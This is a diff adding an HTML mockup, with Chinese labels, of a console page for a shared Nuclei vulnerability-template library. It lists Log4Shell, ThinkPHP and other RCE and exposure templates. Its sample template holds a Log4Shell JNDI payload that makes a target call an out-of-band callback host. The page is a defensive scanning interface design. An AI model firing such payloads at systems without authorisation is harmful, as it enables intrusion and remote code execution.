@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>POC 库 · 方案 C3：控制台台账</title>
+<style>
+	:root {
+		--bg: #f0f2f5;
+		--panel: #ffffff;
+		--line: #0000000f;
+		--line-strong: #0000001a;
+		--text: #000000d9;
+		--dim: #00000057;
+		--accent: #0960bd;
+		--accent-dim: #0960bd0d;
+		--mono: "SF Mono", ui-monospace, Menlo, Consolas, monospace;
+	}
+	* { box-sizing: border-box; margin: 0; padding: 0; }
+	body {
+		background: var(--bg); color: var(--text);
+		font: 13px/1.6 -apple-system, "PingFang SC", "Microsoft YaHei", sans-serif;
+		padding: 20px 24px 60px;
+	}
+	.note { text-align: center; color: var(--dim); margin-bottom: 16px; }
+	.note b { color: var(--accent); }
+
+	/* ---- 页面卡：整页一张卡，内部自带工具条，像一个真正的控制台面板 ---- */
+	.sheet {
+		background: var(--panel); border: 1px solid var(--line); border-radius: 12px;
+		box-shadow: 0 1px 3px #0000000d; overflow: hidden;
+	}
+	.sheet-bar {
+		display: flex; align-items: center; gap: 12px; padding: 12px 18px;
+		border-bottom: 1px solid var(--line); background: #fbfcfd;
+	}
+	.sheet-bar h1 { font-size: 15px; font-weight: 600; }
+	.sheet-bar .sub { font-size: 12px; color: var(--dim); }
+	.sheet-bar .crumb { display: flex; align-items: center; gap: 6px; color: var(--dim); font-size: 12px; }
+	.sheet-bar .crumb .cur { color: var(--accent); }
+	.btn {
+		height: 30px; padding: 0 13px; border-radius: 7px; font-size: 12.5px; cursor: pointer;
+		border: 1px solid var(--line-strong); background: var(--panel); color: var(--text);
+	}
+	.btn:hover { border-color: #0003; }
+	.btn.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
+	.btn.primary:hover { background: #0a6cd5; }
+
+	/* ---- 工具条：搜索 + 等级下拉 + 标签下拉，紧凑一行 ---- */
+	.toolbar { display: flex; gap: 8px; padding: 10px 18px; border-bottom: 1px solid var(--line); align-items: center; }
+	.toolbar input {
+		flex: 1; max-width: 420px; height: 30px; border: 1px solid var(--line-strong); border-radius: 7px;
+		padding: 0 11px; font-size: 12.5px; outline: none; background: var(--panel);
+	}
+	.toolbar input:focus { border-color: var(--accent); box-shadow: 0 0 0 2px var(--accent-dim); }
+	.toolbar select {
+		height: 30px; border: 1px solid var(--line-strong); border-radius: 7px; background: var(--panel);
+		font-size: 12px; color: var(--dim); padding: 0 8px; outline: none; cursor: pointer;
+	}
+	.toolbar .hits { margin-left: auto; font-size: 12px; color: var(--dim); font-variant-numeric: tabular-nums; }
+	.toolbar .hits b { color: var(--text); }
+
+	/* ---- 台账表：斑马纹 + 粘性表头 + 排序列 ---- */
+	.tablewrap { max-height: 560px; overflow: auto; }
+	table { width: 100%; border-collapse: collapse; }
+	thead th {
+		position: sticky; top: 0; background: #fbfcfd; z-index: 1;
+		text-align: left; font-size: 11px; font-weight: 550; color: var(--dim);
+		padding: 8px 14px; border-bottom: 1px solid var(--line-strong); white-space: nowrap; cursor: pointer; user-select: none;
+	}
+	thead th:hover { color: var(--accent); }
+	thead th .arr { font-size: 9px; margin-left: 4px; opacity: .8; }
+	tbody td { padding: 9px 14px; border-bottom: 1px solid var(--line); vertical-align: middle; }
+	tbody tr.main { cursor: pointer; }
+	tbody tr.main:nth-child(4n + 1), tbody tr.main:nth-child(4n + 2) { background: #fbfcfd66; }
+	tbody tr.main:hover { background: var(--accent-dim); }
+	tbody tr.main.open { background: var(--accent-dim); box-shadow: inset 3px 0 0 var(--accent); }
+	td.id { font-family: var(--mono); font-size: 12px; color: var(--accent); }
+	td.name { font-size: 12.5px; max-width: 360px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+	.sev {
+		font-size: 11px; padding: 2px 0 2px 9px; border-left-width: 3px; border-left-style: solid;
+		font-weight: 550; letter-spacing: .02em;
+	}
+	.sev.critical { color: #cf1322; border-left-color: #cf1322; }
+	.sev.high { color: #d4380d; border-left-color: #d4380d; }
+	.sev.medium { color: #d46b08; border-left-color: #d46b08; }
+	.sev.low { color: #0958d9; border-left-color: #0958d9; }
+	.sev.info { color: #389e0d; border-left-color: #389e0d; }
+	td .tags { display: flex; gap: 4px; flex-wrap: wrap; }
+	td .tags span {
+		font-family: var(--mono); font-size: 10.5px; color: var(--dim);
+		background: #00000006; border: 1px solid var(--line); padding: 0 6px; border-radius: 999px;
+	}
+	td.cve { font-family: var(--mono); font-size: 11.5px; color: #000000a6; }
+	td.when { font-size: 11.5px; color: var(--dim); font-variant-numeric: tabular-nums; white-space: nowrap; }
+	td.op button {
+		border: none; background: none; color: #0002; cursor: pointer; font-size: 12px; padding: 3px 7px; border-radius: 4px;
+	}
+	tr.main:hover td.op button { color: var(--dim); }
+	td.op button:hover { color: #cf1322; background: #cf13220d; }
+	.caret { color: #0002; font-size: 9px; transition: transform .12s; display: inline-block; }
+	tr.main.open .caret { transform: rotate(90deg); color: var(--accent); }
+
+	/* ---- 展开：暗色终端块嵌在白表里 ---- */
+	tr.detail td { padding: 0 14px 12px 40px; background: var(--panel); cursor: default; }
+	.term { border-radius: 8px; overflow: hidden; border: 1px solid #21262d; }
+	.term-head {
+		display: flex; align-items: center; gap: 8px; background: #161b22; padding: 6px 12px;
+		border-bottom: 1px solid #21262d;
+	}
+	.term-head .traffic { display: flex; gap: 5px; }
+	.term-head .traffic i { width: 9px; height: 9px; border-radius: 50%; display: block; }
+	.term-head .traffic i:nth-child(1) { background: #ff5f57; } .term-head .traffic i:nth-child(2) { background: #febc2e; } .term-head .traffic i:nth-child(3) { background: #28c840; }
+	.term-head .file { font-family: var(--mono); font-size: 11px; color: #8b949e; }
+	.term-head .ops { margin-left: auto; display: flex; gap: 6px; }
+	.term-head .ops button {
+		background: #21262d; border: none; color: #c9d1d9; font-size: 11px; padding: 2px 10px; border-radius: 5px; cursor: pointer;
+	}
+	.term-head .ops button:hover { background: #30363d; }
+	.term pre { margin: 0; padding: 12px 14px; background: #0d1117; font-family: var(--mono); font-size: 11.5px; line-height: 1.7; color: #c9d1d9; max-height: 260px; overflow: auto; }
+
+	/* ---- 页脚：分页 ---- */
+	.sheet-foot {
+		display: flex; align-items: center; padding: 10px 18px; border-top: 1px solid var(--line);
+		font-size: 12px; color: var(--dim); background: #fbfcfd;
+	}
+	.pager { margin-left: auto; display: flex; gap: 4px; }
+	.pager span {
+		min-width: 26px; height: 26px; display: inline-flex; align-items: center; justify-content: center;
+		border-radius: 6px; cursor: pointer; font-variant-numeric: tabular-nums;
+	}
+	.pager span:hover { background: #0000000a; }
+	.pager span.on { background: var(--accent); color: #fff; }
+</style>
+</head>
+<body>
+<div class="note">C3 · <b>控制台台账</b> —— 整页一张面板卡：面包屑工具条 + 斑马表 + 粘性表头 + 排序 + 分页 + 嵌入式终端块。点击行展开。</div>
+
+<div class="sheet">
+	<div class="sheet-bar">
+		<div class="crumb">工作台 <span>/</span> <span class="cur">POC 库</span></div>
+		<h1>Nuclei 模板中心</h1>
+		<span class="sub">共 128 个 · Agent 侧只读（poc_search / poc_read）</span>
+		<span style="margin-left:auto; display:flex; gap:8px;">
+			<button class="btn">导出清单</button>
+			<button class="btn primary">导入 yaml / zip</button>
+		</span>
+	</div>
+	<div class="toolbar">
+		<input placeholder="搜索模板 id、名称、标签或 CVE…" />
+		<select><option>全部等级</option><option>严重</option><option>高危</option><option>中危</option><option>低危</option><option>信息</option></select>
+		<select><option>全部标签</option><option>cve</option><option>rce</option><option>exposure</option><option>wordpress</option></select>
+		<span class="hits">第 1–6 条 / 共 <b>128</b> 条</span>
+	</div>
+
+	<div class="tablewrap">
+	<table>
+		<thead>
+			<tr>
+				<th style="width:24px"></th>
+				<th>模板 ID <span class="arr">▼</span></th>
+				<th>等级</th><th>名称</th><th>标签</th><th>CVE</th>
+				<th>导入时间 <span class="arr">▲</span></th><th></th>
+			</tr>
+		</thead>
+		<tbody id="rows"></tbody>
+	</table>
+	</div>
+
+	<div class="sheet-foot">
+		<span>库为全局共享；模板不进容器，Agent 需自己写 yaml 后经 bash 执行 nuclei</span>
+		<div class="pager"><span>‹</span><span class="on">1</span><span>2</span><span>3</span><span>…</span><span>22</span><span>›</span></div>
+	</div>
+</div>
+
+<script>
+	const data = [
+		{ id: "CVE-2021-44228-log4j-rce", sev: "critical", name: "Apache Log4j2 JNDI 远程代码执行（Log4Shell）", tags: ["cve", "rce"], cve: "CVE-2021-44228", when: "10-12 14:03", file: "log4shell.yaml" },
+		{ id: "thinkphp-5023-rce", sev: "critical", name: "ThinkPHP 5.0.23 invokefunction 远程代码执行", tags: ["rce", "thinkphp"], cve: "—", when: "10-12 14:03", file: "thinkphp.yaml" },
+		{ id: "shiro-deserialization", sev: "high", name: "Apache Shiro rememberMe 反序列化命令执行", tags: ["deserialization", "shiro"], cve: "—", when: "10-11 09:41", file: "shiro.yaml" },
+		{ id: "weblogic-iiop-t3-weak", sev: "high", name: "WebLogic IIOP/T3 反序列化（CVE-2020-2883）", tags: ["cve"], cve: "CVE-2020-2883", when: "10-11 09:41", file: "weblogic.yaml" },
+		{ id: "springboot-env-exposure", sev: "medium", name: "Spring Boot actuator env 端点信息泄露", tags: ["exposure", "springboot"], cve: "—", when: "10-10 18:22", file: "springboot.yaml" },
+		{ id: "git-config-exposure", sev: "low", name: "Git 配置文件泄露（/.git/config）", tags: ["exposure", "git"], cve: "—", when: "10-09 11:05", file: "git.yaml" },
+	];
+	const sevLabel = { critical: "严重", high: "高危", medium: "中危", low: "低危", info: "信息" };
+	const sample = `id: CVE-2021-44228-log4j-rce
+
+info:
+  name: Apache Log4j2 JNDI Remote Code Execution (Log4Shell)
+  severity: critical
+  tags: cve,rce
+  classification:
+    cve-id: CVE-2021-44228
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?x=${jndi:ldap://{{interactsh-url}}/a}"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"`;
+	const rows = document.getElementById("rows");
+	let openIndex = 0;
+	function render() {
+		rows.innerHTML = data.map((d, i) => {
+			const main = `<tr class="main ${i === openIndex ? "open" : ""}" onclick="toggle(${i})">
+				<td><span class="caret">▶</span></td>
+				<td class="id">${d.id}</td>
+				<td><span class="sev ${d.sev}">${sevLabel[d.sev]}</span></td>
+				<td class="name">${d.name}</td>
+				<td><span class="tags">${d.tags.map((t) => `<span>${t}</span>`).join("")}</span></td>
+				<td class="cve">${d.cve}</td>
+				<td class="when">${d.when}</td>
+				<td class="op"><button>删除</button></td>
+			</tr>`;
+			const detail = i === openIndex
+				? `<tr class="detail" onclick="event.stopPropagation()"><td colspan="8"><div class="term">
+						<div class="term-head">
+							<span class="traffic"><i></i><i></i><i></i></span>
+							<span class="file">${d.file} · 导入 ${d.when} · ${d.tags.join(", ")}</span>
+							<span class="ops"><button>复制全文</button><button>删除模板</button></span>
+						</div>
+						<pre>${sample}</pre>
+					</div></td></tr>`
+				: "";
+			return main + detail;
+		}).join("");
+	}
+	function toggle(i) { openIndex = openIndex === i ? -1 : i; render(); }
+	render();
+</script>
+</body>
+</html>
